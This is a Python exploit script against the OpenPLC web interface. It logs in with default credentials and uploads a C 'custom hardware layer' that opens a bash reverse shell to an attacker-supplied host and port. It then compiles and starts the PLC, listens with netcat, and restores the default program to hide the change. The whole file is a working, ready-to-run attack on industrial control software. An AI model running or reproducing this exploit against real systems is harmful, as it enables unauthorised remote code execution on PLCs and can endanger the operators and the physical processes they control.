#!/usr/bin/env python3
#Enjoy
import sys
import argparse
import requests
from time import sleep
import subprocess
import threading

def parse_arguments():
    parser = argparse.ArgumentParser(description="Automate interactions with OpenPLC web interface.")
    parser.add_argument('url', help='Target URL with http(s)://')
    parser.add_argument('-u', help='Username', default='openplc')
    parser.add_argument('-p', help='Password', default='openplc')
    parser.add_argument('-t', help='Request Timeout, increase if server is slow', default=60, type=int)
    parser.add_argument('-lh', help='Local Host for reverse shell', required=True)
    parser.add_argument('-lp', help='Local Port for reverse shell', required=True)
    return parser.parse_args()

def initialize_session():
    return requests.Session()

def validate_target_url(target):
    if not target.startswith(('http://', 'https://')):
        print('[-] Invalid target, URL expected.')
        sys.exit()
    if target.endswith('/'):
        target = target[:-1]
    return target

def check_service_status(session, url, timeout):
    response = session.get(url, timeout=timeout)
    if response.status_code == 200:
        print('[+] Service is Online!')
    else:
        print(f'[-] Status : {response.status_code}')
        sys.exit()

def perform_login(session, url, username, password, timeout):
    payload = {'username': username, 'password': password}
    response = session.post(url, data=payload, timeout=timeout)
    if response.status_code == 200:
        if 'Bad credentials' in response.text:
            print('[-] Invalid Credentials!')
            sys.exit()
        else:
            print('[+] Logged in!')
    else:
        print(f'[-] Status : {response.status_code}')
        sys.exit()

def upload_payload(session, url, lhost, lport, timeout):
    payload_template = '''
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>

int ignored_bool_inputs[] = {-1};
int ignored_bool_outputs[] = {-1};
int ignored_int_inputs[] = {-1};
int ignored_int_outputs[] = {-1};

void initCustomLayer() {}

void updateCustomIn() {}

#define LHOST "<IP>"
#define LPORT "<PORT>"

void updateCustomOut() {
    int pipefd[2];
    pid_t pid;

    if (pipe(pipefd) == -1) {
        exit(EXIT_FAILURE);
    }

    pid = fork();
    if (pid == -1) {
        exit(EXIT_FAILURE);
    }

    if (pid == 0) {
        close(pipefd[0]);
        dup2(pipefd[1], STDOUT_FILENO);
        execl("/bin/bash", "/bin/bash", "-c", "/bin/bash -i >& /dev/tcp/" LHOST "/" LPORT " 0>&1 &", NULL);
        exit(EXIT_FAILURE);
    } else {
        close(pipefd[1]);
        wait(NULL);
    }
}
'''
    modded_payload = payload_template.replace('<IP>', lhost).replace('<PORT>', lport).encode()
    files = {
        'hardware_layer': (None, b'blank_linux'),
        'custom_layer_code': (None, modded_payload)
    }
    response = session.post(url, files=files, timeout=timeout)
    
    if response.status_code == 200:
        print('[+] Payload uploaded!')
        return True
    else:
        print(f'[-] Status : {response.status_code}')
        sys.exit()

def compile_program(session, url, timeout):
    response = session.get(url, timeout=timeout)
    if response.status_code == 200:
        print('[+] Waiting for 5 seconds...')
        sleep(5)
        print('[+] Compilation successful!')
    else:
        print(f'[-] Status : {response.status_code}')
        sys.exit()

def start_plc(session, url, timeout):
    response = session.get(url, timeout=timeout)
    if response.status_code == 200:
        print('[+] PLC Started! Check listener...')
    else:
        print(f'[-] Status : {response.status_code}')

def cleanup(session, stop_url, restore_url, timeout):
    response = session.get(stop_url, timeout=timeout)
    if response.status_code == 200:
        print('[+] PLC Stopped!')
    else:
        print(f'Status : {response.status_code}')
    
    response = session.get(restore_url, timeout=timeout)
    if response.status_code == 200:
        sleep(10)
        print('[+] Cleanup successful!')
    else:
        print(f'Status : {response.status_code}')
        sys.exit()

def start_nc_listener(lhost, lport):
    print('[!] Starting Netcat listener...')
    subprocess.call(["nc", "-lvnp", lport, "-s", lhost])

def main():
    args = parse_arguments()
    sess_obj = initialize_session()
    TARGET = validate_target_url(args.url)

    login_url = f'{TARGET}/login'
    upload_url = f'{TARGET}/hardware'
    compile_url = f'{TARGET}/compile-program?file=blank_program.st'
    stop_url = f'{TARGET}/stop_plc'
    start_url = f'{TARGET}/start_plc'
    restore_url = f'{TARGET}/restore_custom_hardware'

    BANNER = '''
-------------------------------------------------------------------------------------------------------------
 ______     ______     ______     ______     __  __     ______     ______        ______   __         ______    
/\  == \   /\  == \   /\  ___\   /\  __ \   /\ \/ /    /\  ___\   /\  == \      /\  == \ /\ \       /\  ___\   
\ \  __<   \ \  __<   \ \  __\   \ \  __ \  \ \  _"-.  \ \  __\   \ \  __<      \ \  _-/ \ \ \____  \ \ \____  
 \ \_____\  \ \_\ \_\  \ \_____\  \ \_\ \_\  \ \_\ \_\  \ \_____\  \ \_\ \_\     \ \_\    \ \_____\  \ \_____\ 
  \/_____/   \/_/ /_/   \/_____/   \/_/\/_/   \/_/\/_/   \/_____/   \/_/ /_/      \/_/     \/_____/   \/_____/ 
                                                                                                                   
--------------------------------------------------------------------------------------------------------------

[-] Custom by : Adib Nayaf Abdala :) 
'''

    print(BANNER)
    print(f'[-] Target   : {TARGET}')
    print(f'[-] Username : {args.u}')
    print(f'[-] Password : {args.p}')
    print(f'[-] Timeout  : {args.t} secs')
    print(f'[-] LHOST    : {args.lh}')
    print(f'[-] LPORT    : {args.lp}\n')

    try:
        # Start the Netcat listener in a separate thread
        listener_thread = threading.Thread(target=start_nc_listener, args=(args.lh, args.lp))
        listener_thread.start()

        print('[!] Checking status...')
        check_service_status(sess_obj, TARGET, args.t)
        print('[!] Logging in...')
        perform_login(sess_obj, login_url, args.u, args.p, args.t)
        sleep(1)
        print('[!] Restoring default program...')
        cleanup(sess_obj, stop_url, restore_url, args.t)
        sleep(1)
        print('[!] Uploading payload...')
        if upload_payload(sess_obj, upload_url, args.lh, args.lp, args.t):
            compile_program(sess_obj, compile_url, args.t)
        print('[!] Starting PLC...')
        start_plc(sess_obj, start_url, args.t)
        sleep(1)
        print('[!] Cleaning up...')
        cleanup(sess_obj, stop_url, restore_url, args.t)
        
        # Wait for the Netcat listener thread to finish
        listener_thread.join()
    except requests.exceptions.Timeout as e:
        print(f'[-] Exception: Timeout - {e}')
    except Exception as exc:
        print(f'[-] Exception: {exc}')
        sys.exit()
    except KeyboardInterrupt:
        print('[!] Exiting...')
        sys.exit()

if __name__ == "__main__":
    main()
